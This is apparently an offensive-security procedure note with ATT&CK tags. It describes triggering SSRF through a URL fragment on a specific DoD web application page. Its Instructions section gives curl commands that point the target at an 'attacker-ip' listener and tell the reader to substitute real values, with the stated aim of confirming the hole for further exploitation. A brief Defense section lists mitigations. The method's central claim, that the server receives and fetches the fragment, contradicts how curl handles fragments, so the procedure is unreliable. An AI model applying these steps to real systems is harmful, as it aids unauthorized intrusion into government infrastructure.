---
tags:
  - ssrf
  - url-fragment
  - exploit
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-trigger-ssrf]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 6521c64c-f9e9-4501-bac0-3f339bbf1c9a
created_at: '2025-12-14T04:39:09.921Z'
updated_at: '2025-12-14T04:39:09.921Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Trigger-SSRF-via-URL-Fragment

## Summary

This procedure exploits a Server-Side Request Forgery (SSRF) vulnerability by crafting a URL with a malicious fragment that tricks the target web application into making an external request to an attacker-controlled endpoint. It targets applications that naively process URL fragments for content fetching without validation.

## Description

The vulnerability occurs in a DoD web application where navigating to a URL like http://target/help/ACPS.htm#http://attacker:port causes the server to interpret and request the fragment as a full external URL. This allows forcing requests to internal services, metadata endpoints, or attacker servers. Prerequisites include public access to the application and a running listener. Outcomes include unauthorized server-side requests, potentially leading to data leaks or pivoting.

## Requirements

1. Publicly accessible target web application (e.g., DoD site)
2. Knowledge of the vulnerable endpoint (e.g., /help/ACPS.htm)
3. Active listener on attacker's server (from prior setup)

## Defense

Defensive measures and detection strategies:

- Sanitize and validate all URL inputs, ignoring or stripping fragments
- Restrict server-side outbound requests to whitelisted domains/ports
- Log and alert on unexpected external connections from web servers

## Objectives

1. Force the target server to initiate a request to attacker endpoint
2. Bypass client-side restrictions on requests
3. Confirm vulnerability for further exploitation

## Instructions

### Step 1: Craft the Malicious URL

**Context**: Construct the URL by appending the fragment with the attacker's server details to the vulnerable page.

**Command** ([[commands/curl-trigger-ssrf]]):
```bash
curl "http://target.example.gov/help/ACPS.htm#http://attacker-ip:8080"
```

> Replace placeholders with real values. This sends the request; the server processes the fragment backend, initiating a connection to attacker-ip:8080. Expected output is the page content, but the SSRF happens server-side.

### Step 2: Verify Trigger

**Context**: Check for errors or confirm via listener in parallel.

**Command** ([[commands/curl-trigger-ssrf]]):
```bash
curl -v "http://target.example.gov/help/ACPS.htm#http://attacker-ip:8080/test"
```

> Use -v for verbose to see response headers. Success if no client errors and listener receives data.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-trigger-ssrf]]

## Tools Used


## Tags

- [[ssrf]]
- [[exploit]]
